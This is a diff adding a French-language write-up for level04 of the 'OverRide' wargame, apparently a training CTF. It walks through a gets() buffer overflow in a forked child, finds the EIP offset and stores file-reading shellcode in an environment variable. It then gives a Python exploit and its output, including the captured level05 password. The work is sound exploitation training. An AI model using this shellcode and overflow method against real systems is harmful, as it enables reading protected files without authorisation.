@@ -1,0 +1,98 @@
+SHELLCODE_FILE_READER
+http://shell-storm.org/shellcode/files/shellcode-73.php
+
+
+
+FORK DEBUG
+gdb -> set follow-fork-mode child
+
+ltrace -f
+https://sourceware.org/gdb/onlinedocs/gdb/Forks.html
+
+On va utilise un buffer overflow dans un process 
+créer par le binair car il utilise gets avec un shellcode 
+qui va ouvrir et lire le fichier .pass de l'utilisateur level05
+
+
+1 - On va suivre l'execution du process 'enfant' pour voir si on peut le faire segfault et trouver l'offset grace a la fonction gets -
+
+level04@OverRide:~$ gdb -q ./level04
+Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
+(gdb) set follow-fork-mode child
+(gdb) set disassembly-flavor i
+(gdb) r <<< $(python -c "print 'A' * 200")
+Starting program: /home/users/level04/level04 <<< $(python -c "print 'A' * 200")
+[New process 12546]
+Give me some shellcode, k
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 12546]
+0x41414141 in ?? ()
+
+=> On a reussit ! Maintenant trouvons l'offset avec une string adaptée (https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)
+
+Starting program: /home/users/level04/level04 <<< $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'")
+[New process 12550]
+Give me some shellcode, k
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 12550]
+0x41326641 in ?? ()
+
+OFFSET = 156
+
+2 - On va stocker notre shellcode la ou notre process enfant pourra y acceder et trouver son adresse -
+
+Pour cela on va stocker notre shellcode dans une variable d'environement pour qu'il soit accessible par tout les process avec 'export'
+
+export SHELLCODE=$"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"
+export SHELLCODE=$(python -c "print '\x90' * 100 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass")
+
+(gdb) x/s *environ
+0xffffd7f2:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322\353\062[\260\005\061\311̀\211\306\353\006\260\001\061\333̀\211\363\260\003\203\354\001\215\f$\262\001̀1\333\071\303t\346\260\004\263\001\262\001̀\203\304\001\353\337\350\311\377\377\377/home/users/level05/.pass"
+(gdb) x/20i 0xffffd7f2
+   0xffffd7f2:	push   ebx
+   0xffffd7f3:	dec    eax
+   0xffffd7f4:	inc    ebp
+   0xffffd7f5:	dec    esp
+   0xffffd7f6:	dec    esp
+   0xffffd7f7:	inc    ebx
+   0xffffd7f8:	dec    edi
+   0xffffd7f9:	inc    esp
+   0xffffd7fa:	inc    ebp
+   0xffffd7fb:	cmp    eax,0x90909090
+   0xffffd800:	nop
+   0xffffd801:	nop
+   0xffffd802:	nop
+   0xffffd803:	nop
+   0xffffd804:	nop
+   0xffffd805:	nop
+   0xffffd806:	nop
+   0xffffd807:	nop
+   0xffffd808:	nop
+   0xffffd809:	nop
+
+On peut choisir n'importe quelle adresse dans le slide nop
+
+Par exemple 0xffffd809
+
+3 - Créer l'exploit avec python pour overwrite eip avec l'adresse de notre shellcode -
+
+# coding: utf-8
+import struct
+
+buffer = 156
+eip = <adresse du shellcode>
+
+PAD = "A" * buffer
+EIP = struct.pack("I", eip)
+
+print PAD + EIP
+
+
+4 - On lance notre exploit avec l'executable -
+
+level04@OverRide:~$ python exploit.py | ./level04
+Give me some shellcode, k
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+child is exiting...
